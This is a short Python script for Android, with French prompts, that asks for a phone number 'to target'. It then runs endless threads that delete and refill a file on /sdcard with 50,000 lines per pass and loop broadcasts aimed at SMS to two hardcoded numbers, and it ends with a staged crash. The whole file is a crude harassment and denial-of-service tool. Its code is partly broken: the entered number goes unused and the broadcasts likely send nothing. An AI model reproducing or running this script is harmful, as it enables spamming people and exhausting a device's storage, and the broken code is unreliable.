from colorama import Fore
import sys
import threading
import time
import random
import androidhelper

data = []

def accumulate_data():
    while True:
        androidhelper.os.system('sleep 0.05')
        androidhelper.os.system('rm -rf /sdcard/data.txt')
        for _ in range(50000):
            androidhelper.os.system('echo "Message automatique" >> /sdcard/data.txt')

def spam():
    while True:
        androidhelper.os.system('sleep 0.01')
        androidhelper.os.system('am broadcast -a android.intent.action.SEND -d ' + 'sms:1234567890' + ' ' + '-e sms_body ""')
        androidhelper.os.system('am broadcast -a android.intent.action.SEND -d ' + 'sms:9876543210' + ' ' + '-e sms_body ""')

def crash():
    raise Exception("CRASH")

def main():
    print(Fore.GREEN + "\n[ OPTION 1 ACTIVÉE ]")
    print("Entrez le numéro de téléphone à cibler :")
    num_tel = input()
    print("Vous avez entré :", num_tel)

    threading.Thread(target=accumulate_data).start()

    time.sleep(6)

    print("Déclenchement du spam...")
    threading.Thread(target=spam).start()

    print("Déclenchement du crash...")
    try:
        crash()
    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        print("Erreur:", exc_type, exc_obj)
        print("Numéro d'erreur:", exc_tb.tb_lineno)
        print("Crashed successfully !")

if __name__ == "__main__":
    main()
